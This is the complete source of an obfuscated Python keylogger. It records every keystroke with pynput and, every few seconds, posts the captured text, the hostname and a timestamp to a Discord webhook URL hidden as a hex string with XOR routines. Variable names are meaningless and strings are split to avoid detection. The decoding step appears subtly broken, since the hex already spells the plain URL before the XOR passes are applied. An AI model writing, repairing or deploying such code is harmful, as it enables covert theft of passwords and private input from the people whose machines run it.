import os
import base64
import importlib
import sys
from pynput import keyboard
import requests
import threading
import socket
import time
import codecs
import random

# Hex encoded and XOR encrypted strings
hex_str_1 = "68747470733a2f2f646973636f72642e636f6d2f6170692f776562686f6f6b732f313431323436303639383930363339343731352f777061683850785f4a58595a58566161475866693754456b5470796f7172546d7262637a344a696b654c335037385552796939744d5635655641797067526b6e7a4b5765"
hex_str_2 = "6465"

# XOR key
xor_key = 0x55

# Additional encryption key
enc_key = b'thisisaverylongkey12345'

# Decode hex strings, XOR decrypt, and additional encryption
def decode_hex_xor_encrypt(hex_str, xor_key, enc_key):
    decoded_bytes = codecs.decode(hex_str, 'hex')
    decrypted_bytes = bytearray()
    for b in decoded_bytes:
        decrypted_bytes.append(b ^ xor_key)
    encrypted_bytes = bytearray()
    for i in range(len(decrypted_bytes)):
        encrypted_bytes.append(decrypted_bytes[i] ^ enc_key[i % len(enc_key)])
    return encrypted_bytes.decode('utf-8')

# Dynamic import
def dynamic_import(module_name):
    return importlib.import_module(module_name)

# Obfuscated variable names and initialization
v1 = ""
v2 = decode_hex_xor_encrypt(hex_str_1, xor_key, enc_key)
v3 = 3

# Get device name
v4 = socket.gethostname()

def v5():
    global v1
    if v1:
        v6 = time.strftime("%d/%m/%Y %H:%M", time.localtime())
        v7 = f"F" + "rom (" + v4 + ") T" + "ime: " + v6 + "\n" + v1
        v8 = {
            "c" + "ontent": v7,
            "t" + "itle": "K" + "ey L" + "ogger"
        }
        requests.post(v2, json=v8)
        v1 = ""
    v9 = threading.Timer(random.uniform(2.5, 3.5), v5)
    v9.start()

def v10(v11):
    global v1
    if v11 == keyboard.Key.space:
        v1 += " "
    elif v11 == keyboard.Key.enter:
        v1 += "[E" + "NTER]"
    elif v11 == keyboard.Key.shift:
        v1 += "[S" + "HIFT]"
    elif v11 == keyboard.Key.tab:
        v1 += "[T" + "AB]"
    elif v11 == keyboard.Key.backspace:
        v1 += "[B" + "ACKSPACE]"
    elif v11 == keyboard.Key.alt_l:
        v1 += "[L" + "EFT_ALT]"
    elif v11 == keyboard.Key.esc:
        v1 += "[E" + "SC]"
    elif v11 == keyboard.Key.ctrl_l or v11 == keyboard.Key.ctrl_r:
        pass
    else:
        v1 += str(v11).strip("'")

with keyboard.Listener(on_press=v10) as v12:
    v5()
    v12.join()